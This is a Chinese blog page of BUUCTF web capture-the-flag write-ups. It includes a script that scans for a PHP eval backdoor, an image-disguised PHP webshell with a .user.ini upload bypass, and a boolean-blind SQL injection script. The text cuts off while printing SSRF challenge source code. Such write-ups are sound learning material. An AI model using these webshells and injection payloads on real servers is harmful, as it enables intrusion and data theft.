<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="BUUCTF-web刷题Ⅰ"><meta name="keywords" content="CTF,web,SQL注入,布尔盲注,报错注入,哈希长度扩展攻击,RCE,302跳转,反序列化漏洞,phar反序列化漏洞,反序列化逃逸漏洞,http协议走私,SSRF,文件上传,user.ini上传漏洞"><meta name="author" content="ggb0n"><meta name="copyright" content="ggb0n"><title>BUUCTF-web刷题Ⅰ | ggb0n's Blog</title><link rel="shortcut icon" href="http://www.ggb0n.cool/images/icon2.png"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#BUUCTF-WEB刷题记录"><span class="toc-number">1.</span> <span class="toc-text">BUUCTF-WEB刷题记录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#强网杯-2019-高明的黑客"><span class="toc-number">2.</span> <span class="toc-text">[强网杯 2019]高明的黑客</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析"><span class="toc-number">2.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题脚本"><span class="toc-number">2.2.</span> <span class="toc-text">解题脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-CheckIn"><span class="toc-number">3.</span> <span class="toc-text">[SUCTF 2019]CheckIn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析-1"><span class="toc-number">3.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#user-ini"><span class="toc-number">3.2.</span> <span class="toc-text">.user.ini</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题"><span class="toc-number">3.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019华北-HackWorld"><span class="toc-number">4.</span> <span class="toc-text">[CISCN 2019华北]HackWorld</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析-2"><span class="toc-number">4.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-1"><span class="toc-number">4.2.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#De1CTF-2019-SSRF-Me"><span class="toc-number">5.</span> <span class="toc-text">[De1CTF 2019]SSRF Me</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析："><span class="toc-number">5.1.</span> <span class="toc-text">题目分析：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题思路"><span class="toc-number">5.2.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-2"><span class="toc-number">5.3.</span> <span class="toc-text">解题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF"><span class="toc-number">5.3.1.</span> <span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hash长度扩展攻击"><span class="toc-number">5.3.2.</span> <span class="toc-text">Hash长度扩展攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#网鼎杯-2018-Fakebook"><span class="toc-number">6.</span> <span class="toc-text">[网鼎杯 2018]Fakebook</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析-3"><span class="toc-number">6.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#进行GET注入"><span class="toc-number">6.2.</span> <span class="toc-text">进行GET注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用File协议进行SSRF读取flag文件"><span class="toc-number">6.3.</span> <span class="toc-text">利用File协议进行SSRF读取flag文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#极客大挑战-2019-Havefun"><span class="toc-number">7.</span> <span class="toc-text">[极客大挑战 2019]Havefun</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RoarCTF-2019-EasyJava"><span class="toc-number">8.</span> <span class="toc-text">[RoarCTF 2019]EasyJava</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#极客大挑战-2019-Secret-File"><span class="toc-number">9.</span> <span class="toc-text">[极客大挑战 2019]Secret File</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF-2019-Ping-Ping-Ping"><span class="toc-number">10.</span> <span class="toc-text">[GXYCTF 2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#极客大挑战-2019-PHP"><span class="toc-number">11.</span> <span class="toc-text">[极客大挑战 2019]PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析-4"><span class="toc-number">11.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造payload"><span class="toc-number">11.2.</span> <span class="toc-text">构造payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0CTF-2016-piapiapia"><span class="toc-number">12.</span> <span class="toc-text">[0CTF 2016]piapiapia</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析-5"><span class="toc-number">12.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-3"><span class="toc-number">12.2.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#极客大挑战-2019-Knife"><span class="toc-number">13.</span> <span class="toc-text">[极客大挑战 2019]Knife</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-华北-Dropbox"><span class="toc-number">14.</span> <span class="toc-text">[CISCN2019 华北]Dropbox</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析-6"><span class="toc-number">14.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造phar文件"><span class="toc-number">14.2.</span> <span class="toc-text">构造phar文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-4"><span class="toc-number">14.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RoarCTF-2019-Easy-Calc"><span class="toc-number">15.</span> <span class="toc-text">[RoarCTF 2019]Easy Calc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析-7"><span class="toc-number">15.1.</span> <span class="toc-text">题目分析</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="http://www.ggb0n.cool/images/header2.jpg"></div><div class="author-info__name text-center">ggb0n</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/ggb0n" target="_blank" rel="noopener">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">19</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">84</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">8</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Friends Links</div><a class="author-info-links__name text-center" href="https://f61d.github.io" target="_blank" rel="noopener">f61d</a><a class="author-info-links__name text-center" href="https://15h3na0.xyz" target="_blank" rel="noopener">15h3na0</a><a class="author-info-links__name text-center" href="https://sxadmin.github.io" target="_blank" rel="noopener">Myself'</a><a class="author-info-links__name text-center" href="https://diao-diaoupup.cn" target="_blank" rel="noopener">51nd0re1</a><a class="author-info-links__name text-center" href="http://caoyi.site" target="_blank" rel="noopener">Amateur</a><a class="author-info-links__name text-center" href="https://www.cnblogs.com/ph1sh" target="_blank" rel="noopener">ph1sh</a><a class="author-info-links__name text-center" href="http://129.204.207.114:99" target="_blank" rel="noopener">HyyMbb</a><a class="author-info-links__name text-center" href="https://ajatars.github.io/" target="_blank" rel="noopener">Ajatar</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(http://www.ggb0n.cool/images/back2.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">ggb0n's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/links">Friend links</a><a class="site-page" href="/about">About</a><a class="site-page" href="/tools">Tools</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">BUUCTF-web刷题Ⅰ</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-07</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">CTF学习记录</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/BUU%E5%88%B7%E9%A2%98/">BUU刷题</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">8.2k</span><span class="post-meta__separator">|</span><span>Reading time: 34 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="BUUCTF-WEB刷题记录"><a href="#BUUCTF-WEB刷题记录" class="headerlink" title="BUUCTF-WEB刷题记录"></a>BUUCTF-WEB刷题记录</h2><p>在家圈着，有时间可以好好刷刷题了，看glzjin处处打广告，早就想把BUU的题好好刷刷了，从现在开始吧！</p>
<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入链接之后是下图的页面：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web2.png" alt=""><br>提示我们源码在<code>www.tar.gz</code>中，那么我们把源码下载下来进行审计。<br>发现是这个压缩包包含了几千个php文件，并且每个文件里代码都不少，参数也都是乱序字母，像是经过加密的一样…<br><img src="http://www.ggb0n.cool/images/BUUCTF-web0.png" alt=""><br>但是，经过审计代码，我们发现，很多文件中都包含了不少的<code>GET</code>和<code>POST</code>方式进行传参的代码，并且还有很多调用<code>eval</code>的地方，这不就是后门嘛，但是经过测试，在<code>eval</code>调用的参数中传入命令没有效果…<br>这么多文件，每个文件又是这么多参数和<code>eval</code>的调用，猜测是在某个文件中包含可以成功拿到<code>shell</code>的参数和<code>eval</code>调用，这么多文件，只好写脚本进行测试，来找到存在后门的文件了。</p>
<h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><p>这里参考一个工作效率比较高的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">'开始时间：  '</span>+ time.asctime(time.localtime(time.time())))</span><br><span class="line">s1 = threading.Semaphore(<span class="number">100</span>)  							  			<span class="comment">#信号量，设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r"F:/phpStudy_64/phpstudy_pro/WWW/src/"</span></span><br><span class="line">os.chdir(filePath)													<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>								<span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>											<span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span><span class="params">(file)</span>:</span></span><br><span class="line">    s1.acquire()                                                    <span class="comment">#每当调用acquire()时内置计数器-1</span></span><br><span class="line">    print(<span class="string">'trying   '</span>+file+<span class="string">'     '</span>+time.asctime(time.localtime(time.time())))</span><br><span class="line">    <span class="keyword">with</span> open(file,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:							<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = list(re.findall(<span class="string">'\$_GET\[\'(.*?)\'\]'</span>, f.read()))</span><br><span class="line">            posts = list(re.findall(<span class="string">'\$_POST\[\'(.*?)\'\]'</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;														<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;														<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">"echo 'xxxxxx';"</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">"echo 'xxxxxx';"</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1/src/'</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)			<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()												<span class="comment"># 关闭请求,释放内存</span></span><br><span class="line">    req.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:									<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">'?%s='</span>%a+<span class="string">"echo 'xxxxxx';"</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()												<span class="comment"># 关闭请求,释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">"echo 'xxxxxx';"</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:													<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">'找到了利用文件： '</span>+file+<span class="string">"  and 找到了利用的参数：%s"</span> %param)</span><br><span class="line">        print(<span class="string">'结束时间：  '</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:															<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>
<p>这个脚本会输出存在后门的文件名和可以拿到<code>shell</code>的参数，我们拿到参数之后，再传参，<code>url</code>参数内容为<code>cat /flag</code>即可拿到flag。<br><img src="http://www.ggb0n.cool/images/BUUCTF-web1.png" alt=""></p>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>打开链接，是一个文件上传页面，第一反应上传图片马<br><img src="http://www.ggb0n.cool/images/BUUCTF-web3.png" alt=""><br>结果显示<code>&lt;? in contents!</code>这提示我们上传的图片马中不能包含<code>&lt;?</code>，同时也得知是黑名单过滤了，那么可以利用<code>&lt;script language=&#39;php&#39;&gt;&lt;scirpt&gt;</code>类型的图片马来绕过过滤，和NCTF中的一道题是一样的知识点。我们构造这种图片马上传，回显如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web4.png" alt=""><br>提示<code>exif_imagetype:not image!</code>，猜测后端应该调用了php的<code>exif_imagetype()</code>函数，这个在图片马中添加图片文件头就可以绕过，这里添加<code>GIF89a</code>来绕过，上传之后回显如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web5.png" alt=""><br>我们看到，文件成功上传，但是现在用蚁剑链接的话，还是失败，因为传上去的带图片文件头的图片马并没有被解析，因此需要上传<code>.htaccess</code>文件或者<code>.user.ini</code>文件来解析图片马。这里服务器版本比较高不能用<code>.htaccess</code>来解析，那么便需要用<code>.user.ini</code>来解析我们上传的图片马。</p>
<h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p>这是一个与php配置相关的文件，可以在php手册查看对其的描述：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web6.png" alt=""><br>从官方描述中我们看到<code>.user.ini</code>可以支持用户配置<code>php.ini</code>中的<strong>PHP_INI_PERDIR</strong>和<strong>PHP_INI_USER</strong>，只要是在<code>CGI/FastCGI</code>模式的服务器上都支持<code>.user.ini</code>。<br>同时我们在官方手册关于<strong>php.ini配置选项列表</strong>的描述中看到<code>auto_append_file</code>和<code>auto_prepend_file</code>都适用在<strong>PHP_INI_PERDIR</strong>中，即可以通过<code>.user.ini</code>来配置它们。我们需要知道这两个配置的作用：</p>
<ul>
<li>1、auto_append_file：指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了<code>require()</code>函数。</li>
<li>2、auto_prepend_file：指定一个文件，自动包含在要执行的文件后，但是如果在包含之前遇到<code>exit()</code>函数便不会包含。</li>
<li>它们的使用方法是直接写在<code>.user.ini</code>中即可，如：</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">auto_append_file=<span class="number">01.</span>gif</span><br><span class="line">auto_prepend_file=<span class="number">01.</span>gif</span><br></pre></td></tr></table></figure>

<p>至此，我们的解题思路就很明确了：</p>
<ul>
<li>1、构造包含<code>GIF89a</code>的图片马</li>
<li>2、图片马用<code>&lt;script language=&#39;php&#39;&gt;&lt;scirpt&gt;</code>类型的代码</li>
<li>3、构造<code>.user.ini</code>文件，其中包含我们要上传的图片马名称</li>
<li>4、先传入<code>.user.ini</code>然后上传图片马</li>
<li>5、蚁剑连接，拿flag</li>
</ul>
<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p><strong>构造图片马：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_POST[<span class="string">'x'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>构造.user.ini文件</strong></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="built_in">auto</span>_prepend_file=xxx.jpg <span class="comment">//注意：该处的名称要与图片马的名称相同</span></span><br></pre></td></tr></table></figure>
<p>将构造好的文件依次上传，然后拿到文件储存的路径，这里需要说明：前面讲过了，<code>auto_append_file</code>和<code>auto_prepend_file</code>的作用是在<strong>在要执行的文件</strong>中包含我们指定的文件，在回显中我们看到，相同文件夹下还包含<code>index.php</code>文件，那么利用它便可以拿到<code>shell</code>。<br><strong>蚁剑连接拿flag</strong><br>用蚁剑连接，在根目录即可拿到flag：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web7.png" alt=""><br>关于<code>.user.ini</code>文件构成的php后门还可以参考：<br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
<h2 id="CISCN-2019华北-HackWorld"><a href="#CISCN-2019华北-HackWorld" class="headerlink" title="[CISCN 2019华北]HackWorld"></a>[CISCN 2019华北]HackWorld</h2><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>打开链接看到如下的输入框：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web8.png" alt=""><br>提示我们flag在<code>flag</code>表中的<code>flag</code>字段，一个SQL注入题，抓包发现输入框的值会通过参数<code>id</code>以<code>POST</code>的方式上传到服务端。<br>测试对输入的限制，结果如下：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>=1  Hello, glzjin wants a girlfriend.</span><br><span class="line"><span class="attribute">id</span>=1' bool(<span class="literal">false</span>)</span><br><span class="line"><span class="attribute">id</span>=1'+空格 SQL Injection Checked.</span><br><span class="line"><span class="attribute">id</span>=1'#    SQL Injection Checked.</span><br></pre></td></tr></table></figure>
<p>我们发现，当输入为1的时候回显<code>Hello, glzjin wants a girlfriend.</code>应该是一个正确的回显，但是输入<code>1&#39;</code>回显<code>bool(false)</code>，并且对于与注入相关的字符会回显<code>SQL Injection Checked.</code>，因此，判断是一个布尔盲注。<br>当输入的表达式为<code>1</code>的时候，会给出正确的回显，那么我们便可以通过在输入框构造结果为<code>1</code>并且逐字符地读取<code>flag</code>字段内容的语句便可以读出flag。</p>
<h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>可以用下面的布尔盲注脚本拿flag：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://b9b3fd3f-2f40-4927-8d69-50ffc78f9a4a.node3.buuoj.cn/index.php"</span></span><br><span class="line">payload = &#123;</span><br><span class="line">	<span class="string">"id"</span> : <span class="string">""</span></span><br><span class="line">&#125;</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">	l = <span class="number">33</span></span><br><span class="line">	r =<span class="number">130</span></span><br><span class="line">	mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">	<span class="keyword">while</span>(l&lt;r):</span><br><span class="line">		payload[<span class="string">"id"</span>] = <span class="string">"0^"</span> + <span class="string">"(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span>.format(i,mid)</span><br><span class="line">		html = requests.post(url,data=payload)</span><br><span class="line">		print(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">			l = mid+<span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			r = mid</span><br><span class="line">		mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span>(chr(mid)==<span class="string">" "</span>):</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	result = result + chr(mid)</span><br><span class="line">	print(result)</span><br><span class="line">print(<span class="string">"flag: "</span> ,result)</span><br></pre></td></tr></table></figure>

<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><h3 id="题目分析："><a href="#题目分析：" class="headerlink" title="题目分析："></a>题目分析：</h3><p>首先拿到源码，是Flask写的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span 